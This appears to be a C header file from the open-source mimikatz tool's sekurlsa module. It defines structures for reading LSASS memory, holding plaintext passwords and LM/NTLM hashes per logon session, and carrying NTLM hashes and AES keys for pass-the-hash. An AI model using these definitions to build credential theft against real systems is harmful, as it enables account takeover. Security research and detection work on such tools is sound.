/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#pragma once
#include "globals.h"
#include "../modules/kull_m_patch.h"
#include "../modules/kull_m_process.h"
#include "../modules/kull_m_handle.h"
#include "../modules/rpc/kull_m_rpc.h"

typedef struct _RTL_BALANCED_LINKS {
	struct _RTL_BALANCED_LINKS *Parent;
	struct _RTL_BALANCED_LINKS *LeftChild;
	struct _RTL_BALANCED_LINKS *RightChild;
	CHAR Balance;
	UCHAR Reserved[3]; // align
} RTL_BALANCED_LINKS, *PRTL_BALANCED_LINKS;

typedef struct _RTL_AVL_TABLE {
	RTL_BALANCED_LINKS BalancedRoot;
	PVOID OrderedPointer;
	ULONG WhichOrderedElement;
	ULONG NumberGenericTableElements;
	ULONG DepthOfTree;
	PRTL_BALANCED_LINKS RestartKey;
	ULONG DeleteCount;
	PVOID CompareRoutine; //
	PVOID AllocateRoutine; //
	PVOID FreeRoutine; //
	PVOID TableContext;
} RTL_AVL_TABLE, *PRTL_AVL_TABLE;

typedef struct _KIWI_GENERIC_PRIMARY_CREDENTIAL
{
	LSA_UNICODE_STRING UserName;
	LSA_UNICODE_STRING Domaine;
	LSA_UNICODE_STRING Password;
} KIWI_GENERIC_PRIMARY_CREDENTIAL, *PKIWI_GENERIC_PRIMARY_CREDENTIAL;

typedef struct _KUHL_M_SEKURLSA_LIB {
	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION Informations;
	BOOL isPresent;
	BOOL isInit;
} KUHL_M_SEKURLSA_LIB, *PKUHL_M_SEKURLSA_LIB;

typedef struct _KUHL_M_SEKURLSA_OS_CONTEXT {
	DWORD MajorVersion;
	DWORD MinorVersion;
	DWORD BuildNumber;
} KUHL_M_SEKURLSA_OS_CONTEXT, *PKUHL_M_SEKURLSA_OS_CONTEXT;

typedef struct _KUHL_M_SEKURLSA_CONTEXT {
	PKULL_M_MEMORY_HANDLE hLsassMem;
	KUHL_M_SEKURLSA_OS_CONTEXT osContext;
} KUHL_M_SEKURLSA_CONTEXT, *PKUHL_M_SEKURLSA_CONTEXT;

typedef NTSTATUS (* PKUHL_M_SEKURLSA_ACQUIRE_KEYS_FUNCS) (PKUHL_M_SEKURLSA_CONTEXT cLsass, PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION lsassLsaSrvModule);
typedef NTSTATUS (* PKUHL_M_SEKURLSA_INIT) ();

typedef struct _KUHL_M_SEKURLSA_LOCAL_HELPER {
	PKUHL_M_SEKURLSA_INIT initLocalLib;
	PKUHL_M_SEKURLSA_INIT cleanLocalLib;
	PKUHL_M_SEKURLSA_ACQUIRE_KEYS_FUNCS AcquireKeys;
	const PLSA_PROTECT_MEMORY * pLsaProtectMemory;
	const PLSA_PROTECT_MEMORY * pLsaUnprotectMemory;
} KUHL_M_SEKURLSA_LOCAL_HELPER, *PKUHL_M_SEKURLSA_LOCAL_HELPER;

typedef struct _KIWI_BASIC_SECURITY_LOGON_SESSION_DATA {
	PKUHL_M_SEKURLSA_CONTEXT	cLsass;
	const KUHL_M_SEKURLSA_LOCAL_HELPER * lsassLocalHelper;
	PLUID						LogonId;
	PLSA_UNICODE_STRING			UserName;
	PLSA_UNICODE_STRING			LogonDomain;
	ULONG						LogonType;
	ULONG						Session;
	PVOID						pCredentials;
	PSID						pSid;
	PVOID						pCredentialManager;
	FILETIME					LogonTime;
	PLSA_UNICODE_STRING			LogonServer;
} KIWI_BASIC_SECURITY_LOGON_SESSION_DATA, *PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA;

typedef void (CALLBACK * PKUHL_M_SEKURLSA_EXTERNAL) (IN CONST PLUID luid, IN CONST PUNICODE_STRING username, IN CONST PUNICODE_STRING domain, IN CONST PUNICODE_STRING password, IN CONST PBYTE lm, IN CONST PBYTE ntlm, IN OUT LPVOID pvData);
typedef void (CALLBACK * PKUHL_M_SEKURLSA_ENUM_LOGONDATA) (IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData);
typedef BOOL (CALLBACK * PKUHL_M_SEKURLSA_ENUM) (IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData);

typedef struct _KUHL_M_SEKURLSA_PACKAGE {
	const wchar_t * Name;
	PKUHL_M_SEKURLSA_ENUM_LOGONDATA CredsForLUIDFunc;
	BOOL isValid;
	const wchar_t * ModuleName;
	KUHL_M_SEKURLSA_LIB Module;
} KUHL_M_SEKURLSA_PACKAGE, *PKUHL_M_SEKURLSA_PACKAGE;

typedef struct _SEKURLSA_PTH_DATA { 
	PLUID		LogonId;
	LPBYTE		NtlmHash;
	LPBYTE		Aes256Key;
	LPBYTE		Aes128Key;
	BOOL		isReplaceOk;
} SEKURLSA_PTH_DATA, *PSEKURLSA_PTH_DATA;